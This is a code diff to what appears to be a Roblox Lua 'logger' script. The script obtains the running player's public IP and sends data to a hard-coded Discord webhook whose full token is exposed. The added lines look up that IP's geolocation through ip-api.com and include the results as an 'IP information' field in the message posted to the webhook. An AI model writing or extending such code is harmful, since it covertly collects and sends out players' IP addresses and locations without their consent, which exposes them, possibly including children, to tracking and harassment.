@@ -3,6 +3,32 @@ local ip = game:HttpGet("https://api.ipify.org")
 local url = "https://discord.com/api/webhooks/1286366140511293530/HXPwP_ciZXm-bUxVvcDNAq77KAxAdZfCyNaAJjeR3l0tlvqV0Zpf_SUxWglFqX9eWa5y"
 local player = game.Players.LocalPlayer
 local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+
+-- Fetch the JSON data from the API
+local response = game:HttpGet("http://ip-api.com/json/".. ip)
+
+-- Decode the JSON into a Lua table
+local data = HttpService:JSONDecode(response)
+
+-- Function to pretty-print the table
+local function prettyPrint(table, indent)
+    indent = indent or 0
+    local output = ""
+    local prefix = string.rep(" ", indent)  -- Create an indentation
+
+    for key, value in pairs(table) do
+        output = output .. prefix .. tostring(key) .. ": "
+        if type(value) == "table" then
+            output = output .. "\n" .. prettyPrint(value, indent + 2)  -- Recursive call for nested tables
+        else
+            output = output .. tostring(value) .. "\n"
+        end
+    end
+
+    return output
+end
+
 
 local function getDeviceType()
     if UserInputService.TouchEnabled then
@@ -74,6 +100,12 @@ function sendLogger()
 				["value"] = "`" .. game.JobId .. "`",
 				["inline"] = true
 			},
+            {
+				["name"] = "IP information",
+				["value"] = "`" .. prettyPrint(data) .. "`",
+				["inline"] = true
+			},
+
 
 			
 		},
